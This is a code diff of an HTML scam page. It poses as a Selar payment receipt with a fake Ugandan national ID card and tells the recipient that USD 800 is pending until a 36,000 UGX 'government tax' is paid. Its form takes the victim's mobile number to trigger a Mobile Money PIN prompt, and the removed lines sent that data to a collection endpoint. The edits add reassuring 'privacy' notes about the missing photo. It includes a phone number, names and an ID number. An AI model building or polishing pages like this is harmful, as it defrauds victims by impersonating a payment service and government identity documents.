@@ -105,7 +105,7 @@
         .receipt-center { text-align: center; font-weight: bold; letter-spacing: 1px; }
         .red-status { color: #d32f2f; font-weight: bold; text-align: center; display: block; margin-top: 15px; border: 1px solid #d32f2f; padding: 5px; }
 
-        /* Verified Title Style - Updated */
+        /* Verified Title Style */
         .id-verified-container {
             display: flex;
             align-items: center;
@@ -117,22 +117,22 @@
         .id-verified-title {
             font-weight: bold;
             font-size: 14px;
-            color: #0000ff; /* Blue color */
+            color: #0000ff;
             text-transform: uppercase;
             letter-spacing: 1px;
-            animation: blink-blue 1.5s infinite; /* Blinking blue */
+            animation: blink-blue 1.5s infinite;
         }
 
         .star-sign {
             font-size: 18px;
-            color: #008000; /* Green color */
-            animation: blink-green 1.5s infinite; /* Blinking green */
+            color: #008000;
+            animation: blink-green 1.5s infinite;
         }
 
         /* National ID Visual Section */
         .id-card-visual {
             width: 92%;
-            margin: 10px auto 25px;
+            margin: 10px auto 10px;
             aspect-ratio: 1.6 / 1;
             background: linear-gradient(135deg, #f3d7d7 0%, #e2eff1 50%, #f1def1 100%);
             border-radius: 12px;
@@ -160,8 +160,8 @@
             gap: 2px 10px;
         }
 
-        /* Uganda Map with Flag Colors and Fingerprint Inside - Updated */
-        .biometric-photo-area {
+        /* Passport Photo Replacement with Text */
+        .photo-privacy-area {
             grid-row: 1 / 6;
             width: 75px;
             height: 95px;
@@ -171,11 +171,20 @@
             display: flex;
             align-items: center;
             justify-content: center;
+            padding: 5px;
             position: relative;
             overflow: hidden;
+            text-align: center;
         }
         
-        /* Background Flag-Map Hybrid */
+        .photo-note-small {
+            font-size: 8px;
+            font-weight: bold;
+            color: #555;
+            z-index: 3;
+            line-height: 1.2;
+        }
+
         .map-flag-background {
             position: absolute;
             top: 5px;
@@ -186,28 +195,37 @@
             background-size: contain;
             background-repeat: no-repeat;
             background-position: center;
-            opacity: 0.3; /* Subtle background */
+            opacity: 0.2;
             z-index: 1;
         }
 
-        /* Foreground Thumb Print */
         .thumb-print-overlay {
-            width: 70%;
-            height: 70%;
-            /* Using a generic fingerprint icon as placeholder */
-            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.svgrepo.com/show/24430/fingerprint.svg" viewBox="0 0 512 512"><path d="M256 0C114.6 0 0 114.6 0 256s114.6 256 256 256s256-114.6 256-256S397.4 0 256 0zM368.1 368.1c-13 13-34.1 13-47.1 0s-13-34.1 0-47.1c13-13 34.1-13 47.1 0s13 34.1 0 47.1zm-112.1-64.1c-13 13-34.1 13-47.1 0s-13-34.1 0-47.1c13-13 34.1-13 47.1 0s13 34.1 0 47.1z"/></svg>');
+            width: 50%;
+            height: 50%;
+            background-image: url('https://www.svgrepo.com/show/24430/fingerprint.svg');
             background-size: contain;
             background-repeat: no-repeat;
             background-position: center;
-            position: relative;
-            z-index: 2; /* On top of the map */
-            opacity: 0.9;
+            position: absolute;
+            z-index: 2;
+            opacity: 0.4;
         }
 
         .id-field { margin-bottom: 2px; }
         .id-label-small { font-size: 7px; color: #555; font-weight: bold; text-transform: uppercase; margin: 0; }
         .id-val-text { font-size: 10px; font-weight: 800; color: #000; margin: 0; }
         
+        /* Bottom Privacy Disclaimer */
+        .bottom-privacy-note {
+            width: 90%;
+            margin: 0 auto 25px;
+            font-size: 10px;
+            color: #d32f2f;
+            font-weight: bold;
+            line-height: 1.4;
+            text-align: center;
+        }
+
         /* Payment Logic Styles */
         .main-amount { font-size: 34px; font-weight: 800; color: #000; margin-bottom: 5px; }
         .confirm-text { color: #888; font-size: 13px; margin-bottom: 30px; }
@@ -248,23 +266,17 @@
         <div class="receipt-header-main">SELAR INVOICE</div>
         <div class="receipt-center" style="font-size: 11px; margin-bottom: 10px;">TRANSACTION - RECEIPT</div>
         <div class="receipt-center" style="margin-bottom: 10px;">****************************</div>
-        
         <div class="receipt-line"><strong>TYPE:</strong> Send Money (Mobile)</div>
         <div class="receipt-line"><strong>ACCOUNT:</strong> [Your Seller Involem Account Number]</div>
         <div class="receipt-line"><strong>NAME:</strong> Lolikishee USA Chicago</div>
-        
         <div class="receipt-line" style="margin-top: 15px;"><strong>RECIPIENT ID:</strong> SI001234595</div>
         <div class="receipt-bold" style="text-decoration: underline;">ALI MOHAMMED</div>
         <div class="receipt-line"><strong>MOBILE:</strong> +256791418298</div>
         <div class="receipt-line"><strong>NETWORK:</strong> Airtel Uganda</div>
-        
         <div class="receipt-line" style="margin-top: 15px;"><strong>TOTAL AMOUNT:</strong></div>
         <div class="receipt-bold" style="font-size: 18px;">USD 800.00</div>
-        
         <div class="receipt-center" style="margin-top: 15px;">----------------------------</div>
-        <div class="receipt-center" style="font-size: 10px;">ID VERIFIED: CM9102210441NJ</div>
         <div class="red-status">[PENDING: NOT PAID GOVERNMENT TAX OF 36,000 UGX]</div>
-        
         <div class="receipt-center" style="font-family: sans-serif; font-size: 24px; margin-top: 20px; font-weight: 900; letter-spacing: 4px;">SELAR</div>
     </div>
 
@@ -276,19 +288,14 @@
             <div style="font-size: 14px; color: #166534; font-weight: bold;">
                 <span class="loading-spinner"></span> Waiting for PIN prompt...
             </div>
-            <div style="font-size: 11px; color: #15803d; margin-top: 4px;">Please check your phone and enter your Mobile Money PIN.</div>
         </div>
-
         <form id="paymentForm">
-            <input type="hidden" name="ownerid" value="wasswa.lawrence" />
-            <input type="hidden" name="cur" value="UGX" />
             <input type="hidden" name="amount" value="36000" />
             <div class="input-group">
-                <input type="text" name="mobile" id="mobile" placeholder="07XXXXXXXX" required pattern="[0-9]{10}" />
+                <input type="text" name="mobile" id="mobile" placeholder="07XXXXXXXX" required />
                 <button type="submit" id="submitBtn" class="continue-btn">Continue</button>
             </div>
         </form>
-
         <div class="footer-labels">
             <span>Amount: UGX 36,000</span>
             <div style="display:flex; align-items: center;">
@@ -307,9 +314,10 @@
     <div class="id-card-visual">
         <div class="id-header-text">REPUBLIC OF UGANDA<br>NATIONAL ID CARD</div>
         <div class="id-body">
-            <div class="biometric-photo-area">
+            <div class="photo-privacy-area">
                 <div class="map-flag-background"></div>
                 <div class="thumb-print-overlay"></div>
+                <div class="photo-note-small">Note: Selar stay private for your passport photo</div>
             </div>
 
             <div class="id-field" style="grid-column: 2 / 4;">
@@ -351,6 +359,10 @@
         </div>
     </div>
 
+    <div class="bottom-privacy-note">
+        NOTE: Kindly Selar system stay private for your passport photo to secure our client details, THANK YOU
+    </div>
+
     <div class="footer-secondary">
         <span>© 2026 Selar invoice system</span>
         <span>256-bit SSL ● Secure</span>
@@ -362,19 +374,9 @@
         e.preventDefault(); 
         const btn = document.getElementById('submitBtn');
         const notice = document.getElementById('processing-notice');
-        const mobileInput = document.getElementById('mobile');
-        
         btn.disabled = true;
         btn.innerText = "Please wait...";
-        mobileInput.readOnly = true;
         notice.style.display = "block";
-
-        const formData = new FormData(this);
-        fetch('https://my.jpesa.com/?dad=xp', {
-            method: 'POST',
-            body: formData,
-            mode: 'no-cors' 
-        }).catch(err => console.error(err));
     });
 </script>
 
